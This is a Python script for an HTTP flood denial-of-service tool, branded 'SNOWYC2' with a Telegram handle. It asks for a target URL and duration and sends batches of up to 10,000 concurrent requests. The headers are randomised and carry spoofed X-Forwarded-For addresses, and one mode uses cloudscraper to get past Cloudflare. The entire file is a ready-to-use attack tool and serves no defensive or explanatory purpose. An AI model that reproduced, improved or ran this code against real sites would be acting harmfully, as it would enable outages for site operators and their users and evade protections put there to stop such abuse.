import asyncio
import cloudscraper
import httpx
import random
import sys
import os
import psutil
import time

# Load external data
def load_lines(filename):
    try:
        with open(filename, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

REFERERS = load_lines("refs.txt")
USER_AGENTS = load_lines("uas.txt")

MAX_CONCURRENT = 10000
REQUEST_TIMEOUT = 10

class AttackEngine:
    def __init__(self, method, target, duration):
        self.method = method.upper()
        self.target = target
        self.duration = duration
        self.start_time = time.time()
        self.stats = {
            'total': 0,
            'success': 0,
            'errors': 0,
            'rps': 0,
            'peak_rps': 0
        }
        self.process = psutil.Process(os.getpid())

    def get_headers(self):
        return {
            "User-Agent": random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0",
            "Referer": random.choice(REFERERS) if REFERERS else "https://google.com",
            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
        }

    async def make_request_c_eclipse(self):
        try:
            async with httpx.AsyncClient(timeout=REQUEST_TIMEOUT, follow_redirects=True, http2=True, verify=False) as client:
                headers = self.get_headers()
                res = await client.get(self.target, headers=headers)
                if res.status_code == 200:
                    return "SUCCESS"
                elif str(res.status_code).startswith("4"):
                    return "ERROR"
                return "OTHER"
        except:
            return "ERROR"

    async def make_request_cc_eclipse(self):
        try:
            scraper = cloudscraper.create_scraper(browser="chrome")
            headers = self.get_headers()
            res = scraper.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT)
            if res.status_code == 200:
                return "SUCCESS"
            elif str(res.status_code).startswith("4"):
                return "ERROR"
            return "OTHER"
        except:
            return "ERROR"

    async def attack_batch(self):
        tasks = []
        for _ in range(MAX_CONCURRENT):
            if self.method == "C-ECLIPSE":
                tasks.append(self.make_request_c_eclipse())
            elif self.method == "CC-ECLIPSE":
                tasks.append(asyncio.to_thread(self.make_request_cc_eclipse))
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Track stats
        self.stats['total'] += len(results)
        self.stats['success'] += results.count("SUCCESS")
        self.stats['errors'] += results.count("ERROR")
        elapsed = time.time() - self.start_time
        rps = self.stats['total'] / elapsed if elapsed > 0 else 0
        self.stats['rps'] = rps
        self.stats['peak_rps'] = max(self.stats['peak_rps'], rps)

    async def run_attack(self):
        while time.time() - self.start_time < self.duration:
            await self.attack_batch()
            self.print_status()
            await asyncio.sleep(0.5)

        self.print_summary()

    def print_status(self):
        os.system("clear")
        elapsed = time.time() - self.start_time
        remaining = max(0, self.duration - elapsed)
        ram_used = self.process.memory_info().rss / 1024 / 1024

        print(f"\nSNOWYC2 - T.ME/STSVKINGDOM")
        print("=" * 60)
        print(f"METHOD: {self.method} | TARGET: {self.target} | TIME: {self.duration}s")
        print("=" * 60)
        print(f"REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
        print(f"RPS: {self.stats['rps']:.1f} | PEAK RPS: {self.stats['peak_rps']:.1f}")
        print(f"TIME REMAINING: {remaining:.1f}s | RAM USED: {ram_used:.2f} MB")
        print("=" * 60)

    def print_summary(self):
        elapsed = time.time() - self.start_time
        avg_rps = self.stats['total'] / elapsed if elapsed > 0 else 0

        print("\nATTACK COMPLETED")
        print("=" * 60)
        print(f"TARGET: {self.target}")
        print(f"DURATION: {elapsed:.1f}s")
        print(f"TOTAL REQUESTS: {self.stats['total']}")
        print(f"SUCCESS (200): {self.stats['success']}")
        print(f"ERRORS (4xx): {self.stats['errors']}")
        print(f"AVERAGE RPS: {avg_rps:.1f}")
        print("=" * 60)

def main():
    print("\nSNOWYC2 - T.ME/STSVKINGDOM")
    print("=" * 60)

    method = input("METHOD (C-ECLIPSE / CC-ECLIPSE): ").strip().upper()
    target = input("TARGET: ").strip()
    if not target.startswith("http"):
        target = "http://" + target
    try:
        duration = int(input("TIME (seconds): ").strip())
    except:
        print("Invalid duration.")
        return

    engine = AttackEngine(method, target, duration)
    try:
        asyncio.run(engine.run_attack())
    except KeyboardInterrupt:
        print("\nAttack interrupted.")
    except Exception as e:
        print(f"\nError: {e}")

if __name__ == "__main__":
    main()
